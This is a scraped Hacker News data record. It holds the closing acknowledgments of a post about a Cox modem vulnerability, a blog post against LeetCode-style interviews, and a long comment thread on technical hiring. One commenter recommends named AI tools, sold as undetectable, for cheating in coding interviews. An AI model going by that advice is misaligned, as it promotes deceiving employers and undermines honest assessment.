blog, I can now write posts in markdown and have an RSS feed! Thanks to Justin Rhinehart and Alden for working closely with me for the investigation process, providing tons of help doing OSINT stuff. Thanks to Gal Nagli, Brett Buerhaus, Mathias Karlsson, Nathanial Lattimer, Maik Robert, Shubham Shah, Joel Margolis, Justin Gardner, Daley Borda, William Tom, and Ebrietas for reviewing the draft version of this blog post. Thanks to the Cox Communications security team for quickly fixing the issue and staying in touch throughout the process. Find me on:twitter: https://twitter.com/samwcyodiscord: zlz",
    "commentLink": "https://news.ycombinator.com/item?id=40570781",
    "commentBody": "Hacking millions of modems and investigating who hacked my modem (samcurry.net)820 points by xrayarx 14 hours agohidepastfavorite3 comments dang 2 hours ago [–] Comments moved to https://news.ycombinator.com/item?id=40560010 because I felt bad about albinowax_ posting this first and not getting any karma for it. xrayarx, I hope you don't mind! It's on my list to implement proper karma sharing for cases like this. In the meantime we sometimes resort to the crude manual approach. reply xrayarx 37 minutes agoparent [–] Well according to your system, I posted this 13 hours ago, he posted it 10 hours ago. So I can’t quite follow how he posted it first? reply dang 12 minutes agorootparent [–] When we re-up a post, which I did with https://news.ycombinator.com/item?id=40560010, you see a relativized timestamp on the front page and on the /item page (i.e. the thread). See https://hn.algolia.com/?dateRange=all&page=0&prefix=true&que... for explanations of why. The original timestamp is displayed on all other pages, so you can see e.g. from https://news.ycombinator.com/from?site=samcurry.net that albinowax_ submitted the article first; and of course the item IDs are sequential so that's another way to compare the two. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Two years ago, the author discovered their HTTP traffic was being intercepted by an unknown IP address, traced to DigitalOcean, indicating a compromised modem.",
      "After replacing the modem, the author found vulnerabilities in Cox Business's API, allowing unauthorized access to sensitive customer information and device settings.",
      "Cox promptly addressed the significant security flaw after being notified, underscoring the importance of robust security measures for ISPs and highlighting trust issues between ISPs and customer devices."
    ],
    "commentSummary": [
      "A Hacker News user, xrayarx, posted an article about hacking millions of modems, which had previously been posted by another user, albinowax_, who didn't receive karma for it.",
      "Moderator dang moved the comments to albinowax_'s post to ensure proper credit, sparking a discussion about posting times and the need for a better karma-sharing system.",
      "The incident highlights the community's concerns about fair credit and recognition for original content contributions."
    ],
    "points": 820,
    "commentCount": 3,
    "retryCount": 0,
    "time": 1717476418
  },
  {
    "id": 40571395,
    "title": "Why LeetCode-Style Interviews Fail to Reflect Real Software Engineering Skills",
    "originLink": "https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/",
    "originBody": "I Am So Sick of Leetcode-Style Interviews 2024-06-03 · 183 words Opinion I quit my previous job at Robinhood in late November of 2023 mainly for health reasons. I’ve been in various interviews since then. Things have fallen off for one reason or another but I just gotta say…I am getting so tired of Leetcode -style interviews. Especially since I know for a fact they don’t reflect the actual responsibilities of a software engineering of a job. It seems like most (if not all) companies do these kinds of interviews simply because that’s what all the big companies do, like Google, Facebook, Amazon, and so on. I’ve had some very bright engineers tell me that I shouldn’t memorize things that I can easily google. But yet, these interviews quiz me on things that I can easily Google that I may not know off the top of my head. It’s absurd. I don’t really have a solution to this problem, I just know it’s a problem. And I’m sick of it. If you need a Software Engineer with AWS, Kuberentes, and Ruby on Rails experience, and you don’t do silly quizzes, feel free to reach out! Next » Calendly Denial of Service via Mass-Scheduling",
    "commentLink": "https://news.ycombinator.com/item?id=40571395",
    "commentBody": "I am sick of LeetCode-style interviews (nelson.cloud)396 points by nelsonfigueroa 12 hours agohidepastfavorite500 comments SilverBirch 11 hours agoI understand the frustration, but at the end of the day I think they do serve a purpose. They're not great at that purpose, but they're good enough and they generally produce false negatives (smart people fail) rather than false positives (you hire an idiot). And this makes sense, because a false negative is low cost (maybe you spend 50% longer interviewing candidates) but a false positive is high cost (you hire an idiot and have to spend months establishing that, firing them and starting the hiring process again). The side effect of this though, is that it's an extremely painful process for the applicant. Even if you're a great software engineer, you're going to freeze up, miss something, have a bad day, and fail a few interviews. Now for most software engineers failure is an unusual and harrowing experience, so they react really badly to it. Especially ina scenario where it's difficult to blame anyone but yourself. But just don't! It's fine! just move on, there's plenty of jobs and the interview process is a blunt tool, not a final evaluation of your worth in life. reply hintymad 6 minutes agoparentThe problem with Leetcode-style test nowadays is that there's too much cramming. Otherwise, leetcode-style interview has certain correlation with one's geekiness and raw talent. Just this week my team solved a long-tail performance issue by first building a simulation of a queuing system, and also built a customized Coffman–Graham algorithm to resolve the order of execution of a complex task graph. I would certainly appreciate that my team members just get it when someone mentions basic CS concepts like topological order in a graph or queuing theory. reply gumby 8 hours agoparentprevAt all the companies I’ve run we’ve used a simple whiteboard example for this reason. Don’t worry about typos; how does the person think. “Trick” questions are dumb, but you want to get an idea of if the candidate knows their stuff (and let the candidate know what we’re like — interviewing is a sales process in both directions). If someone asks a question like “is it ok to modify the argument” (or says “I’ll assume I can’t modify the argument”) that’s great (or says “I can’t remember if strlen includes the 0 byte so I’ll add 1 — normally I’d look it up”) - again, no trick questions. When I say “simple” it’s something like atoi or “shuffle a deck of cards”: basic, but not 100% trivial like fizzbuzz. On of our best hires was a guy who made a fundamental mistake — when we asked him if it world work as intended he said “I’m a fucking idiot” and fixed it. You’re not supposed to talk like that in an interview I supposed but we read it as a strong positive signal. We had one candidate who insisted that parsing a string and returning an integer was an unreasonable question because there was already a library function for it. “But what if you have an embedded system and no library?” (an actual situation for us, for part of our system). He was adamant — honestly that was a failure of the phone screen: had it been caught it would have saved us, and him, from wasting time. reply Aurornis 5 hours agorootparent> We had one candidate who insisted that parsing a string and returning an integer was an unreasonable question because there was already a library function for it. “But what if you have an embedded system and no library?” (an actual situation for us, for part of our system). He was adamant — honestly that was a failure of the phone screen: had it been caught it would have saved us, and him, from wasting time. Trying to debate the interview format or reject interview questions is one of my hard-stop rejection triggers in interviews now. The couple times I’ve been part of hiring pipelines where candidates argued about the interview itself and then got hired anyway, they became extremely difficult employees within the company. Arguing about interview questions turned into arguing about every other ticket, code reviews, and every architecture choice. I’ve had the same experience where we take an actual problem we solved in our codebase and turned it into a small interview problem. Same thing: Some candidates will try to debate the relevance or try to wriggle out of it. reply red-iron-pine 3 hours agorootparentthere is a lot of stupid bullshit in most orgs, and things only get fixed by often irritable, unreasonable people. \"shut up and do it\" was only an acceptable answer when I was in the military. if the interviewee pushes back and find they don't like the answer, then it's a good signal to both parties. reply ryandrake 1 hour agorootparentThis is definitely something that is dependent on the company culture and the personal preferences of the team. I would never want to work with someone who is constantly argumentative over everything, just because he thinks he's pushing back on bullshit. Sometimes you just have to \"document your objection, but do it anyway.\" reply lumb63 7 hours agorootparentprevI have come to like this approach reasonably well. My current company uses a similarly simple problem to evaluate candidates. For me, it was a breeze, and I thought we’d be hiring slouches left and right. Once I started administering the interview, I realized that the majority of candidates absolutely bomb this simple question for one reason or another. It seems that “able to code a simple problem well” is a far less ridiculous proxy for good software engineer than “able to code a hard problem at all”. Much to my surprise. reply Frost1x 5 hours agorootparent“Simple problems” often aren’t as “simple” as the retrospectively sound if you consider everything like stress level, mixed mindset of the interviewee (they’re not just thinking about a programming problem, they’re also thinking about social queues, mixing conversing in, peer judgement, and loads of other anxiety inducing factors), etc. The software industry is notorious for underestimating overall complexity factors, understanding uncertainty, and time to manage them and interviews seem to be no different. So “simple” problems are often good (I agree with you) because they’re actually not so simple for most people when you factor everything in, they’re often reasonably challenging under the set of circumstances. Meanwhile genuinely difficult problems (in any arbitrary setting and longer timelines) require a whole lot of rote training and reusing little clever idiosyncratic techniques that may or may not be generally useful, so you very often end up with a question lottery on whether you already know how to address the problem in question or not correctly vs having some problem where a reasonable solution and expectations around that can be derived in the time (and environment) it’s taking place. Lots of nonsense. reply tnel77 3 hours agorootparentprevI have a friend who has interviewed about 30-40 software engineering candidates for his company (small, publicly traded company from the midwest). He said that FizzBuzz alone is enough to filter out 25% of applicants. The next slight more challenging question will axe another 30-40% of candidates. I think Leetcode hards exist to stroke the egos of select software engineers. reply ryandrake 1 hour agorootparentYea, smaller and medium sized companies just don't have the recruiting infrastructure to weed out the fakers. When I worked in FAANG companies, by the time a candidate got to me, they were pretty good. They went through enough filters and checkpoints and annoying gates that I never really had to do a FizzBuzz equivalent. When I worked for more medium sized companies, I'd get software engineering candidates who obviously did not even remotely know how to code. Imagine the worst possible software candidate, and then lower your expectation even further. One couldn't even tell me what an \"int\" was. I think a single \"for loop on a whiteboard\" question would filter out at least 50% of candidates. reply bena 5 hours agorootparentprevYou test the floor, not the ceiling. Truth is, I'm never looking for \"the best\", I'm looking for \"good enough to do the job competently\". Because we can hem and haw over what is best for hours. And we could disagree with what qualities in what proportion make someone \"the best\". But we can all generally agree with \"could do the job\". As I've mentioned elsewhere, we're hiring right now and we have the duality of candidates in our pool. There's one guy who is just a hard no from at least two people in the group. And that translates into a no from the third member simply because we're so adamant that he's not the guy. And there's another who we're all feeling really solid on. Not \"the best\", but solid floor and we feel they'll be able to learn. But being able to weed out people who can't even perform the basics despite having a decent resume is invaluable. reply EnergyAmy 1 hour agorootparentprevOfftopic, but there's an interesting parallel between making a mistake like that and AI hallucination. In a human, that behavior is a positive signal, but for many people, that same behavior is proof of how LLMs are just a toy that will never rival human intelligence. reply giancarlostoro 6 hours agorootparentprevThat I wouldnt mind. I didnt do a full on CS degree, that never stopped me from being a good contributor to various teams over 8 years. I have learned the best candidates are the ones who like you say are open about how they messed up, and can get along with your team. It takes one toxic dev to ruin productivity for an entire team. reply IshKebab 5 hours agorootparentprevI agree with all of this. Leetcode questions are fine as long as they aren't actually difficult maths puzzles or brain teasers. We also used atoi/itoa loads and it was pretty much the perfect difficulty. Though I still do start with a short fizzbuzz-level question because you would be surprised how many people fail that and it makes it way less awkward if you start with atoi and they can't write a loop. If they fail fizzbuzz I generally just turn the interview into a chat or give them easy questions to practice, rather than say \"yeah no thanks\", because I feel like the latter is a bit mean, and everyone can benefit from interview practice. reply gumby 1 hour agorootparent> If they fail fizzbuzz I generally just turn the interview into a chat or give them easy questions to practice, rather than say \"yeah no thanks\", because I feel like the latter is a bit mean, and everyone can benefit from interview practice. It’s kind to politely ramp the interview down in that case but I’ve learned to then cut off any later interviews. It’s a waste of the company’s time and the candidate’s too. If we were going to have lunch the recruiter takes them to lunch anyway, unless the (now former) candidate doesn’t want to. reply dicroce 7 hours agorootparentprevYeah, that's much better. reply grishka 9 hours agoparentprevOkay, do do quizzes, but let people google goddamn stuff because that's just how software engineers operate. Don't make it an exam. Don't mimic the worst thing about the education systems. Both in the school and in the university, these goddamn exams were the worst because they tested memory first and everyone else second, and I'm such a kind of person that I could never remember things on command. It was a real struggle. I can't be the only one. I've never been through the \"regular\" IT hiring process myself, but I've interviewed several candidates for an Android developer position. I liked asking questions and looking at how the person thinks. I didn't expect exact correct answers for every question, I just wanted to see whether they have a fundamental understanding of Android. After that, they had to build a small app at home (not my initiative) to show their skills. reply NhanH 10 hours agoparentprev> They're not great at that purpose, but they're good enough and they generally produce false negatives (smart people fail) rather than false positives (you hire an idiot). I've seen this reasoning, but I'm wondering if this is actually true, especially if you also believe the other myth in hiring: most people applying are not qualified for the job. Since most hiring actually requires you to fill the position in the end (in other words, you can't leave it open indefinitely if no one qualifies as eventually the pressure to hire mount up), every false negatives does increase the odd of you hiring a false positives as well. Just take the example at the extreme, if there is only ever one person on Earth qualified for your job and you got a false negatives on him, there is no other way but getting an idiot in the job. reply breckenedge 6 hours agorootparentIn my years of hiring experience, it doesn't hold up. I've hired folks who could leet code all day long, but couldn't develop a feature from scratch, or figure things out without enormous hand holding. I want to hire problem solvers who also know how to code. I stopped doing leet-code interviews about 7 years ago. By all means have people code in interviews, but don’t do leet code. reply Jensson 3 hours agorootparentWere those juniors with no experience developing features? Leetcode doesn't test if they have experience, you need to check both if you want someone that can do everything. Someone who does well on leetcode is usually easy to teach so they will become good/great in a year or two, but if you don't have that time then go for leetcode+experience just like everyone else is. reply breckenedge 3 hours agorootparentLeetcode deselected too many good experienced candidates, which is really who I prefer to hire. I have hired good leetcode juniors that did not improve and are no longer working in software. reply FabHK 4 hours agorootparentprevHow do you test whether they're problem solvers that also know how to code, without leet-code interviews? reply breckenedge 3 hours agorootparentGiving people real world problems and pairing with them on finding a solution. reply rented_mule 1 hour agorootparentI'm retired now, but I used a variant of this that worked well for me. In my experience, much of what we do as engineers is learn new tools and application domains and apply what we learn to solve problems. So I wanted to test how good a candidate is at leaning and whether they appear to enjoy it (good and enjoy often correlate). We would work together at the whiteboard, with me teaching them the basics of our application domain and our internal distributed computation framework. Then there were a series of 5 increasingly difficult iterations we'd work through. First, do a simple calculation. Now there's a need for a more difficult computation. And an even harder one. Then explain that it needs to run over billions of log lines, and it's I/O bound, so let's make it faster. Finally, a problem that requires them to probe me deeply about the nature of the data and only needs a hand-wavy answer (calculate a median in a single pass with limited memory - not too bad once you extract from me that the samples are all integers between 0 and 500). To the candidate, this looked like iteration driven by evolving requirements, not 5 interview questions. I mostly let them drive, but I jump in now and then to keep things on pace. And I would try to answer any question the same way I would as a teammate / mentor. They don't need to get every problem right. The increasing difficulty is designed so that almost everyone gets something right and something wrong ( if you also believe the other myth in hiring: most people applying are not qualified for the job. Depends where you’re looking in the hiring pipeline. If you’re looking at raw applications submitted to a publicly listed job posting, I can say without reservation that the majority of candidates are not qualified. The pre-screening candidate pool is extremely bad on average, especially for remote job listings. Some people spend all day clicking the apply button on every job listing they see. Your post constrains another misunderstanding about the hiring process: The goal isn’t to hire the first person through the system who is good enough to pass some arbitrary threshold. The goal is collect a number of candidates and hire the best one. People hate this reality, but it’s true. reply NhanH 2 hours agorootparent> Your post constrains another misunderstanding about the hiring process: The goal isn’t to hire the first person through the system who is good enough to pass some arbitrary threshold. The goal is collect a number of candidates and hire the best one. People hate this reality, but it’s true. I definitely do not have any misunderstanding here, and my description of hiring is the same as what you wrote, just in different phrasing: after a period of time, the company has to pick a candidate, presumably the best one by their interview signals. I am disputing the standard claim of \"it's better to have false negatives than false positives\" by pointing out how that mindset does not work: since you have to choose someone anyway, the whole \"avoiding false positives\" might not be a thing at all reply FabHK 4 hours agorootparentprev> and hire the best one Or rather: the best fit. You don't need a Turing Award winner to clean up your website. reply johnnyanmac 6 hours agoparentprev>because a false negative is low cost (maybe you spend 50% longer interviewing candidates) this would make sense if they filled these positions in 2,3 weeks tops. But that's the insane part; I hear of interviews going on for 6-7 stages now, lasting almost 6-10 weeks. At that point I feel you are no longer avoiding false positives, but simply hiring the most desperate programmers willing to jump the hoops. The best candidates will get an offer mid interview at that rate. >But just don't! It's fine! just move on, I've been \"just moving on\" for some 9 months now. There's only so much morale in a tank, no matter how BS you know the whole process is. I just wanna move on in life, not be bogged down on how many permutations you can color an N x M grid with. reply Suzuran 6 hours agoparentprevThat false negative can be pretty damn expensive if the good engineer you didn't hire could have saved your ass from the situation the less-good engineer you did hire couldn't handle. reply FabHK 4 hours agorootparentThe latter would be a false-positive, which by assumption is both expensive and rare. reply hiAndrewQuinn 11 hours agoparentprevBingo. A good hire is a windfall, a bad hire can be an existential threat to the team or the entire company. reply KaiserPro 6 hours agorootparent> a bad hire can be an existential threat to the team or the entire company. Totally, but leetcode wont filter them out. Incompetent is fairly easy to navigate around, pathological bastardness is impossible to work past. I know that some companies use psychometric tests, but they are not based in anything remotely scientific, but are also super easy to game. reply Aurornis 5 hours agorootparent> Totally, but leetcode wont filter them out. Coding challenges won’t filter every pathological bad hire, but coding challenges do catch a lot of bad hires. LeetCode shouldn’t be the entirety of the interview. It’s just part of it. reply KaiserPro 1 hour agorootparent> but coding challenges do catch a lot of bad hires. leetcode doesn't catch bad hires, as someone whos done a lot of interviews, we could easily catch \"bad\" coders with a very simple whiteboard test or a \"look at this code and tell me what you think\" but people being bad at code aren't the company killers, its the toxic people who are \"good\" at coding that do. They can be very good at these kind of tests, but are absolute shites to work with. I think we actually agree more that I let on, and you are right that coding tests should only be a part of the interview process. reply beej71 5 hours agorootparentprevBut you hired them at-will, right? The bad hires I've seen that are existential threats were only there because management refused to fire them. reply FabHK 4 hours agorootparentDepends on the jurisdiction, needless to say. I've interviewed in London, say. reply watwut 11 hours agoparentprevThey do produce plenty of false positives - just not \"you hire an idiot\" kind. You will hire a person completely unsuitable for the actual job, but is good at leet. Issue is not the lack of intelligence. Issue is not being software engineer despite being good at algorithms. Or not being good at whatever your position requires. I do work in a team where majority was hired by puzzles of sorts. All of them are smart. They are not software engineers and it shows massively. reply silvestrov 9 hours agorootparentI think Google suffers from a side effect: only the academic side was valued so maintaining existing systems is considered career suicide. Most programming work needs common sense a lot more than it needs theoretical algorithmic knowledge. And almost nobody values good documentation, especially as a competetive advantage. reply FabHK 4 hours agorootparentprevSo how do you find, in an interview setting, good software engineers? (And better than with LeetCode-style questions?) reply mvdtnz 10 hours agorootparentprevMost interview processes I've been through (many, 15 year veteran) involve both the leetcode crap and at least one fit/culture/soft skills round. reply praptak 5 hours agorootparentThe fit/culture/soft skills/ is actually a fall back to \"where did you go to college and tell me about how good you are\", which was the pre-leetcode standard. It is a downgrade in my opinion. reply mvdtnz 16 minutes agorootparentI've had good and bad soft skills interviews. They're harder to get right than tech interviews. reply valenterry 9 hours agorootparentprevWhich is insufficient in terms of technical tests. reply resource_waste 11 hours agorootparentprev>They are not software engineers and it shows massively. Coming from Real Engineering and making 2x more programming, I lol at people who say there is any Engineering in software. We are programmers dealing with layers upon layers of abstraction. Knowing to optimize for time by using vectors is more of an art, than a science. I did do safety critical C code and Assembly which are probably my hole in the whole 'its not engineering'. But javascript/python/backend work: programming. reply Edd1CC 8 hours agorootparentHillel Wayne did a good \"study\" on this by speaking to a bunch of engineers who moved into software, engineers who stayed in software, and engineers who only worked in software (yes, you can be a chartered engineer in most Western countries including the US and UK purely from software). The strong consensus was that software is an engineering discipline, and the nitpicking you can have on any particular topic that is/isn't engineering-y can be applied across the board. But this conversation is totally moot IMO because if you have a bachelors in computer science or software engineering, and a masters in the same discipline, and several years experience, you can apply and become the same chartered engineer from the same association that does \"real\" engineering. reply halfcat 5 hours agorootparent> The strong consensus was that software is an engineering discipline I see it as a difference in time and stakes. We’ve built bridges and boats for thousands of years, where the outcome of failure is people die. This has a lot to do with why it’s easy to estimate the time and cost to build a house, but it’s a rare shaman who can consistently estimate software projects well. Once we’ve built software for even a few hundred years, we’ll probably have it pretty dialed in, too. reply Edd1CC 5 hours agorootparent> We’ve built bridges and boats for thousands of years, where the outcome of failure is people die. We write software that has killed people due to bugs too, such as Therac-25 releasing too much beta radiation killing patients. > This has a lot to do with why it’s easy to estimate the time and cost to build a house My parents and in-laws are property developers and I've also been involved in a build; not one was on time or budget. Some are really off budget, beyond the scale software projects that mess up are. In China they've had projects run into the billions and be decades late. I do understand your points, but this is what I mean when I say you can nitpick any issue with software not being Real Engineering and apply it to other engineering categories too. But yeah we may have a very different process in 50 or 100 years. I'm only 10 years into my career and it's already pretty different to when I started! reply johnnyanmac 6 hours agorootparentprev>I lol at people who say there is any Engineering in software. There definitely is. Safety/mission critical code is definately a more rigorous, formal process where you don't just download a library for padding a string (you probably wouldn't use built-in strings anyway on this kind of code). But I agree that the way most coding works (i.e. move fast and fail often) is completely antithetical to how engineers should work. But there's infinite moneys and almost zero accountability, so who's gonna stop them? >Knowing to optimize for time by using vectors is more of an art, than a science. that's definitely why I fully agree with calling programmers creatives over engineers. once you get past dead simple problems, no two programmers are going to approach a prompt the exact same way. performance, scalabiliy, documenting, version control friendliness, even ephemeral stuff like code style. coders very much are artists who happen to know a lot of math. reply justjash 6 hours agorootparentAs someone who started going to school for Mechanical Engineering and ended up in Comp Sci, I think your last paragraph is what drew me in. So many different ways to solve the problem at hand. reply palata 7 hours agorootparentprev> Coming from Real Engineering One related problem I see is that Computer Science tends to be under-estimated by other engineering fields. A ton of software engineers did not study software. They learned to program as part of their engineering studies, and they believe that they learned both Computer Science and their engineering topic at the same time. I may be biased, but I see fewer computer scientists pretend to be mechanical engineers because they once tuned a PID. reply resource_waste 4 hours agorootparent>One related problem I see is that Computer Science tends to be under-estimated by other engineering fields. If Bachelor of Science computer science grads were that much more extraordinary, they wouldnt be working side by side with non-degreed programmers. Chem Engineer here, I wrote random forest once. My coworker with a CS degree, all front end work. reply palata 3 hours agorootparentMy mistake. If you wrote a random forest once, it certainly means that you should be the CTO of Google. And that chem engineers are all smarter than computer scientists. reply lupusreal 10 hours agorootparentprevThe fact that in 99% of cases \"software engineer\" is just an aggrandizing title given by management to any and every programmer at their company should put a bullet in the head of the pretentions of this being an engineering field. reply ljm 7 hours agorootparentThe term is used ubiquitously in the field of technology and has been for a long time. We also have Tech or Software Architects, and quite obviously they don't do Real Architecture™ or civil engineering, but the concept makes sense. It's just a job title, arguably one without the protections or standards afforded to chartered engineers, and with an incredibly low barrier to entry. Pretty much the reason we have to do this ridiculous dance with tech tests, LeetCode, and 12 stage interview processes. reply lupusreal 5 hours agorootparent> It's just a job title Exactly my point. reply logicchains 11 hours agoparentprevHard leetcode questions hire grinders, not thinkers. Many of those questions were thesis/publication-worthy decades ago when first solved; it's unlikely for even a very intelligent person to produce a similar result in just tens of minutes. So if someone solves it, it's much more likely to be because they saw it or a similar question while grinding practice questions than that they genuinely derived the optimal solution from scratch. reply concordDance 10 hours agorootparentI disagree with this. I can solve the majority of leetcode hard problems in under an hour despite not having seen them before and I'm far from the smartest person I've met. reply djeastm 5 hours agorootparentI don't know you or the people you've met, but if you can do this without studying the questions before and the solutions are performant, then I would put you in the \"very smart\" category reply triyambakam 8 hours agorootparentprevUnder an hour is... not enough time for an interview. Needs to be under 20-30 minutes given that most interviews are 60 minutes and the other 20-50% is taken up by other conversation. reply batshit_beaver 10 hours agorootparentprevCongratulations, you've memorized leetcode patterns. Proves nothing beyond that (except that you've also had the time recently to practice leetcode). reply concordDance 7 hours agorootparentI have never practiced leetcode puzzles or memorised solutions to them. I don't understand why you jumped to this conclusion. reply kirth_gersen 5 hours agorootparentProbably because you said you \"can solve the majority of leetcode hard problems in under an hour\". That could easily give the impression that you have practiced them. If you haven't practiced them, then how do you know you can solve them? reply concordDance 3 hours agorootparentSample of 5-6 I tried for fun. Along with a handful of similar puzzles from other places. reply kristopolous 11 hours agoparentprevThere's an entire industry of bootcamps built on the premise of teaching you how to pass this exact test in like 6 weeks. And because they ask pretty irrelevant questions, the 6 weeker will do better then the recent Stanford PhD who has been studying a specific problem for 5 years or the multimillionaire who spent the past 10 years building and selling successful software companies. Those people will fail and your 6 weeker who's never heard of cmake, diff or gdb will pass. When I see there's leetcode as the hiring process I presume the place is full of bozos because the process actually strongly preferences them. reply CarpaDorada 10 hours agorootparentWell said, like IQ tests, if you train for it you're better at it, but it the meaning of the results is dubious. Recently I failed the first round of a fintech analyst position because I didn't complete the 9 undergrad (or high-school, in certain talented schools) math problems (I have a math PhD) in the 1 hour time frame. In retrospect, I should've cheated using computer/online assistance, and my true failure was my unwillingness to cheat. Not because fintech analysts are cheaters, but because the testing process is nonsense, so recognizing that, one should cheat it (indeed, an analyst mindset!) I'd rather be jobless than to adopt that mentality though. (and in fact I am, the only job I was able to find was a minimum wage service-type job, it can't even pay for daycare, I'd rather raise my child on my own while wife works thank God.) We have high-interest rates and global crises resulting in companies not hiring while simultaneously governments give orders to news media to tout the strong economy. Ineffective hiring practices will always exist, but people don't complain when jobs are available; you only see this type of discussion online when things have gone sideways. reply CoastalCoder 6 hours agorootparent> ... and my true failure was my unwillingness to cheat. Integrity is really tested when it costs you something. I'd call this a true win. (I recognize there are dire situations where cheating might be warranted. I hope you're not there yet.) reply kristopolous 10 hours agorootparentprevIf you want to work, you just need to find the right job. reply alexey-salmin 10 hours agorootparentprevI believe this is a common myth. I've spend around seven years teaching programming and people who can go from zero to decent problem solving in just six weeks are virtually non-existent. Either it wasn't a true \"zero\" but rather they were really good e.g. at advanced math or physics and managed to see some parallels, or it has to be a genius. I'd be very interested in hiring such a person. reply kristopolous 10 hours agorootparentLeet code is not \"decent problem solving skills\" but it's almost always about three types of programs: sliding window, linked list rearrangement, and BFS. The code to solve basically all of them look nearly identical after you classify it and the questions asked (what's the big O of this) are also all identical. It's an extremely narrow and teachable class of problems. There's outliers for sure but the 80th percentile are basically just the same damn things slightly rephrased. It's extremely gameable and doesn't test the kind of breadth say, fixing a crashing program would show. Here's a list of 16 https://github.com/Chanda-Abdul/Several-Coding-Patterns-for-... ... That's the 99th percentile. If you think someone passing that means they can fix the conda bug in your k8s cluster or whatever real problem you have, dream on. It'd be like hiring a cook by quizzing them on the names of kitchen utensils. reply alexey-salmin 8 hours agorootparentWell the thing is, I keep hearing about these people who can't code but excel at leetcode, even that they are mass-trained in some bootcamps, but somehow I never saw one in reality and I interviewed hundreds of people. So I'm kind skeptical this is a real issue. The other way round (people who code, but can't leetcode) I agree it's an issue. Unfortunately as noted here in comments, cost of a bad hire is much much worse than cost of a no-hire, so it's the price I'm willing to pay. reply johnnyanmac 6 hours agorootparent> I keep hearing about these people who can't code but excel at leetcode I think the mass trained at bootcamp is an exaggeration. The best bootcampers are those that use it as an extended education from learning the traditional ways. I'm sure most people here complaining about leetcode can indeed spend 6 weeks there and be interview ready. But few have that time nor spare cash lying around for such a venture. And why should we need to spend thousands just to ace a quiz like it's some SAT? >cost of a bad hire is much much worse than cost of a no-hire, so it's the price I'm willing to pay. At this point I wonder. Hearing way more stories about \"survivors\" from layoffs burning out from jobs that keep promising that they'll hire more staff to help out with. When in reality they have a hiring freeze or are trying to offshore the work that ends up needing more time to be fixed. The stalls in a no-hire aren't just costing money in the lack of productivity, it's costing currently working employees who are doing 2,4, 8+ jobs without any meaningful increase in role/salary. It's not sustainable. You're draining a little bit of blood from a rock, but the rock is clearly starting to crumble. reply lll-o-lll 7 hours agorootparentprevI think all leetcode gives you is a proxy for IQ in the language of code. If someone excels at leetcode, they should be relatively smart and able to write code. Excellent! That’s a something, a something you can measure. Back when I was involved in hiring, it was definitely better than not having that (at junior levels). However, the idea that “IQ is all you need” is so obviously false that I think you need to reconsider. Bill Gates famously, (infamously?), hired for IQ. Microsoft used puzzles as their IQ proxy, and I think leetcode is just a modern variant. Possibly a worse version, as training has a bigger effect. Bill Gates later would claim that he overvalued intelligence. I would say that intelligence is necessary but insufficient. We would get further, faster, with a quick IQ test and then dig into the candidates experience, communication ability and personality. No need to study! The FAANG companies all have a line a mile long of candidates willing to put up with any amount of BS for a chance to work for the name and $$. If you aren’t such a company, trying to hire that game changing person for $$’s you can afford to pay is going to require a different approach. reply CoastalCoder 6 hours agorootparentprev> Leet code is not \"decent problem solving skills\" but it's almost always about three types of programs: sliding window, linked list rearrangement, and BFS. I could be wrong, but I think dynamic-programming problems belong in that list. reply batshit_beaver 10 hours agorootparentprevIt's not \"decent problem solving\" that these folks demonstrate though, it's the ability to grasp and regurgitate common DSA patterns that show up in most leetcode style interviews. Does this ability make these people highly desirable hires? Should you hire such people over engineers with more real world knowledge, but who don't want to spend the time learning or practicing leetcode? reply lr4444lr 8 hours agorootparentprevNot my experience at all. Ask a bootcamper a slight variation on a problem they're clearly doing from memory and they fold. Ask a solid CS person, and they usually get intrigued, and dive right in. reply drewcoo 10 hours agoparentprevIf, after all of the normal interviews, you randomly selected candidates who passed and do not make them offers . . . you generally produce false negatives (assuming the interviews mostly worked). But it's entirely pointless. reply fzeroracer 11 hours agoparentprevHow do you know they produce false negatives over false positives? How do you know if your top candidates simply didn't cheat over the honest candidates that produced worse but honest code? reply mvdtnz 10 hours agorootparentHow do you cheat at live coding? reply ljm 9 hours agorootparentI’ve interviewed people who wore an earpiece and were fed instructions on the fly, and also people who kept their cameras turned off to try and hide the fact they were getting assistance. You started picking up on patterns like them repeating your questions, or spending a lot of time in silence (asking their friend a question) without any other communication or activity on the screen. Like they weren’t there. reply shitlord 7 hours agorootparentI once interviewed someone who was on a call with someone but messed up their audio feed. I could hear the third person but the person I interviewed could not. reply mrbombastic 5 hours agorootparentThat is hilarious reply lokhura 7 hours agorootparentprevNowadays it's easy by using undetectable interviewing AI tools. See: - https://ultracode.ai - https://interviewsolver.com Well worth it. Highly recommend these tools to play the dumb interviewing game. reply yreg 8 hours agoprevI once had an interview that I really liked. It was for a bank. They give the candidate some messy, done-in-a-hurry code (but not purposefully obfuscated) and ask them to refactor it to the best of their ability. The interviewer sits next to the candidate and talks to them throughout the whole process. It's pretty much pair programming, but the candidate has the initiative. I found it to be a breath of fresh air after all the leetcode interviews. Of course, they have the luxury of doing this, because they know what exact technologies they are using and they don't need to measure candidate's ability to learn new tech, etc. In their situation they are more interested in topics like whether the candidate can produce maintainable code, name things properly or communicate with co-workers. reply palata 8 hours agoparent> because they know what exact technologies they are using and they don't need to measure candidate's ability to learn new tech, etc Well leetcode interviews do not measure the candidate's ability to learn new tech either, do they? reply kamaal 5 hours agorootparentLeetcode is mostly small time snippets, that tests how intelligently you can write nested for loops and if statements. That's mostly it. If you are looking to hire people to writeThen over time these grinders get high enough up they start becoming interviewers themselves and they don't understand that they're even supposed to screen for talent, they conduct the interview like a memory test since to them that's what it was. They say As hire Bs and Bs hire Cs . . . and to combat that we've added more leetcode to the interview process. reply Tao3300 6 hours agoparentprev> Then over time these grinders get high enough up they start becoming interviewers themselves and they don't understand that they're even supposed to screen for talent, they conduct the interview like a memory test since to them that's what it was. It follows that better leetcode scoring is a good indicator of who can be replaced with LLM. reply dinobones 11 hours agoprevLeetcode style interviews probably serve two functions: 1) A way to suppress wages and job mobility for SWE. Who wants to switch jobs when it means studying for a month or two? Also, if you get unlucky and some try hard drops an atomic LC hard bomb on you now you have an entire company you can no longer apply to for a year. 2) A way to mask bias in the process while claiming that it’s a fair process because everyone has a clear/similar objective. Meet someone who went to your Alma mater? Same gender? Same race? Give them the same question as everyone else, but hint them through it, ignore some syntax errors, and give them a strong hire for “communication” when they didn’t even implement the optimal approach… Or is it someone you don’t like for X reason? Drop a leetcode hard on them and send them packing and just remain silent the 